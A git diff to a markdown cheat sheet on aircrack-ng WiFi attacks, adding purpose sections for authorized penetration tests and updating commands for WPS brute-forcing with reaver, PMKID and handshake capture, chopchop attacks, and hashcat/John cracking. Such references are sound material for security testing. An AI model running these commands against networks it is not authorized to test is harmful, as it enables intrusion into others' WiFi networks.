@@ -1,4 +1,18 @@
-## Advanced Aircrack-ng Commands 📡
+# Advanced Aircrack-ng Commands 📡
+
+## 🎯 Purpose
+Command reference for the classic aircrack-ng suite workflow — monitor mode, handshake/PMKID capture, and WEP/WPA/WPS attacks using `airmon-ng`/`airodump-ng`/`aireplay-ng`/`aircrack-ng` themselves. This is the full-suite counterpart to [hcxtoolshashcat.md](hcxtoolshashcat.md), which covers only the newer hcxdumptool/hcxtools capture pipeline.
+
+## ⚙️ Function
+Linear workflow from monitor-mode setup through capture to cracking, plus a reference block of advanced `airodump-ng`/`aireplay-ng` flags. Differs from `hcxtoolshashcat.md` in that it requires monitor mode and covers WEP and WPS attacks (`reaver`, ARP replay, fragmentation/chopchop) that the hcxdumptool pipeline doesn't touch; it overlaps with that file only in the PMKID-capture step, which now defers to hcxtools since aircrack-ng itself has no native PMKID capture.
+
+## 🏆 Goal
+Get from a stock WiFi adapter to a cracked WEP key or a WPA/WPA2 handshake/PMKID hash ready for offline cracking, using only the aircrack-ng suite plus hashcat/John for the cracking step.
+
+## 📋 When to Use
+- Authorized WiFi penetration tests requiring the classic monitor-mode workflow (WEP, WPS, or handshake-based WPA/WPA2 attacks)
+- Any engagement where hcxdumptool's clientless capture isn't applicable and a full deauth-and-capture cycle is needed
+- Reference lookup for specific `airodump-ng`/`aireplay-ng` flags
 
 ### Basic Workflow
 
@@ -68,12 +82,13 @@ sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv -K
 # Capture PMKID
 sudo hcxdumptool -i wlan1mon -o pmkid.pcapng --enable_status=1
 
-# Convert to hashcat format
-hcxpcaptool -z pmkid.16800 pmkid.pcapng
+# Convert to hashcat format (hcxpcaptool is deprecated; use hcxpcapngtool)
+hcxpcapngtool -o pmkid.22000 pmkid.pcapng
 
-# Crack with hashcat
-hashcat -m 16800 pmkid.16800 wordlist.txt
+# Crack with hashcat (unified 22000 format, replaces deprecated mode 16800)
+hashcat -m 22000 pmkid.22000 wordlist.txt
 ```
+*(See [hcxtoolshashcat.md](hcxtoolshashcat.md) for the full hcxdumptool/hcxtools capture workflow — this is a shortcut reference, not the complete pipeline.)*
 
 **Airodump-ng Advanced Options**
 ```bash
@@ -107,7 +122,10 @@ sudo aireplay-ng --chopchop -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon
 
 **Converting Capture Files**
 ```bash
-# Convert cap to hccapx (for hashcat)
+# Modern path: convert directly to the unified hashcat 22000 format
+hcxpcapngtool -o output.22000 capture-01.cap
+
+# Legacy path: cap2hccapx (from hashcat-utils) for the old hccapx format / mode 2500 workflow
 cap2hccapx.bin capture-01.cap output.hccapx
 
 # Merge multiple capture files
@@ -119,11 +137,14 @@ wpaclean cleaned.cap capture-01.cap
 
 **Cracking with External Tools**
 ```bash
-# Hashcat WPA/WPA2
-hashcat -m 2500 capture.hccapx wordlist.txt
+# Hashcat WPA/WPA2/WPA3 — recommended unified mode (replaces deprecated 2500/16800)
+hashcat -m 22000 output.22000 wordlist.txt
 
 # Hashcat with rules
-hashcat -m 2500 capture.hccapx wordlist.txt -r rules/best64.rule
+hashcat -m 22000 output.22000 wordlist.txt -r rules/best64.rule
+
+# Legacy hccapx workflow (mode 2500) still works but is deprecated by hashcat upstream
+hashcat -m 2500 capture.hccapx wordlist.txt
 
 # John the Ripper
 hccap2john capture.hccap > hash.txt
